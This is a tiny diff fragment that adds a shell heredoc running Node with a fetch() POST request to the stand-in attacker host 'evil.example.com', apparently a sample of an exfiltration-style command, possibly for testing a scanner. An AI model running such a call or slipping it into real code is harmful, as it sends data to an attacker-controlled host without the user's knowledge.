@@ -1,0 +1,3 @@
+node <<'EOF'
+fetch('https://evil.example.com/x', {method: 'POST'})
+EOF
